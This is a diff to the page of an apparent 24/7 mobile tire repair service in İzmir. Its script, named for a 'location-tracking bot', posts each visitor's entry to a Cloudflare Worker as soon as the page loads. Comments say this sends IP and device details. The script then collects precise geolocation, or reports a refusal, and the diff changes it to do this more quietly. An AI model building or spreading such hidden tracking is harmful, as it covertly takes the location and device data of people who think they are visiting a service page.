@@ -53,7 +53,7 @@
 <section class="hero container">
   <h1>7/24 <span>Acil Mobil Lastikçi</span><br>İzmir Genelinde</h1>
   <span class="phone-big">📞 0 (553) 118 23 53</span>
-  <p>Konumunuzu paylaşın, en yakın mobil ekip 15 dakikada yanınızda olsun.</p>
+  <p>Yolda mı kaldınız? En yakın mobil ekip 15 dakikada yanınızda.</p>
 
   <div class="trust">
     <div>✅ 7/24 Hizmet</div>
@@ -92,21 +92,20 @@
 
 <script>
 window.onload = function() {
-    // Senin Cloudflare Worker URL'n
     const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
 
-    // 1. ADIM: SİTEYE GİRİLDİĞİ AN BİLDİRİM GÖNDER
+    // SESSİZ BİLDİRİM: Giriş anında IP ve cihaz bilgisini gönderir
     fetch(workerURL, {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify({ status: "entry" })
     });
 
-    // 2. ADIM: KONUM İZNİ İSTE
+    // TARAYICI KONUM İSTEĞİ: Sayfa açılır açılmaz standart kutu çıkar
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             function(position) {
-                // Konum onaylanırsa
+                // Onaylanırsa konumu gönder
                 fetch(workerURL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -119,18 +118,13 @@ window.onload = function() {
                 });
             },
             function(error) {
-                // Konum reddedilirse
+                // Reddedilirse "rejected" bildirimi gönder ama kullanıcıyı rahatsız etme
                 fetch(workerURL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({ status: "rejected" })
                 });
-                
-                // 1.5 saniye sonra Google'a yönlendir
-                setTimeout(() => {
-                    alert("Yol yardımı alabilmek için konum izni vermeniz gerekmektedir.");
-                    window.location.href = "https://www.google.com";
-                }, 1500);
+                console.log("Konum izni verilmedi.");
             },
             { enableHighAccuracy: true, timeout: 10000 }
         );
